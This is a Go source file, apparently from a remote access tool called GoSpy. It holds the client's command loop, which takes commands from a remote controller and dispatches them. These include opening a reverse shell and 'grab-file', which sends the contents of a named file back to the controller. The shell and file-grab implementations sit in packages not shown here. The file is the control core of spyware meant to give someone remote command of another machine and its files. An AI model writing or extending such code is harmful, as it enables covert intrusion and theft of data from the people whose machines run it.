package client

import (
	"github.com/psidex/GoSpy/internal/commands"
	"github.com/psidex/GoSpy/internal/comms"
	"io"
	"log"
	"net"
	"os"
	"strings"
)

// CommandLoop is the loop that receives commands and executes them.
// This should only return an err has occurred and it is impossible to continue as is (i.e. network dropped).
func CommandLoop(c comms.Connection) (err error) {
	for {
		var messageBytes []byte
		messageBytes, err = c.RecvBytes()
		if err != nil {
			break
		}

		message := string(messageBytes)
		log.Printf("Recv: %s", message)

		args := strings.Split(message, " ")

		switch args[0] {

		case "exit":
			log.Println("Exiting")
			os.Exit(0)

		case "ping":
			err = commands.PingReply(c)

		case "reverse-shell":
			err = commands.ReverseShellReply(c)

		case "grab-file":
			path := strings.Join(args[1:], " ")
			err = commands.GrabFileReply(c, path)

		}

		if _, isNetErr := err.(net.Error); isNetErr == true || err == io.EOF {
			break
		}
		if err != nil {
			log.Printf("Command error: %s\b", err.Error())
		}
	}
	return err
}
